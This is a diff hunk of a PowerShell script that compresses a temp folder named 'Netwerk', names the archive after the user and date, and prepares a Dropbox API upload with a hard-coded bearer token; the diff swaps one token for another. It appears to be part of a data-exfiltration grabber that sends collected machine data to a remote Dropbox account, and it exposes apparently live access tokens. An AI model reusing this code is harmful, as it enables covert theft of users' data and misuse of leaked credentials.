@@ -6,7 +6,7 @@ Compress-Archive -Path $env:Temp\Netwerk\* -CompressionLevel NoCompression -Dest
 $TargetFilePath="/$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
 $SourceFilePath="$env:TMP\$env:USERNAME-$(get-date -f yyyy-MM-dd).zip"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + "sl.BpfM75WyBPchj047mGU2DswISMkOBlDVcVtREt_3oELV8xglD4BwvrgmyS9a8w"+"D62k3DN2vKZU0f9OYXAwTx2HV6JKhxELKEoh1i0Creh-dQzbkudriL7OXENQ9VswvEQtcoOf5HnlyV"
+$authorization = "Bearer " + "sl.BpcOrMmxWErZuDBimk7J7R1EECvBohf94qd4d5Tf914aYp4PTnV5l7dXGYPGjjz0yC" + "aAqa0TiXZcYotPGmez-fPdddOV6ygOgA1r0IBQN4pUqee7J-7z8wrOwuv9oo5YT5mi30iHDpx_yeNR_TCYhW8"
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", $arg)
